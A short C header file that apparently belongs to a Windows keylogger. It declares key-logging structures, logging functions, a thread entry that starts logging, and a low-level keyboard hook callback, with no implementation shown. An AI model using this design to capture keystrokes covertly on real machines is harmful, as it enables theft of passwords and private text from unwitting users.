#pragma once
#include <Windows.h>
#include "../constants.h"

typedef struct _SPECIAL_KEY {
	int key_code;
	BOOL down;
	char repr[MAX_REPR_LEN];
} SPECIAL_KEY;

typedef struct _SYMBOL {
	int special_key;
	int key_code;
	char repr[2];
} SYMBOL;

unsigned int __stdcall start_logging(void* _);

int log_number(int key_code);

void log_letter(int key_code);

void log_special(SPECIAL_KEY* special_key);

void log_symbols(int key_code);

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

BOOL lkey_or_rkey_down(int lkey_code);

void read_file(char* buffer, LPDWORD bytes_read, int max_bytes_to_read);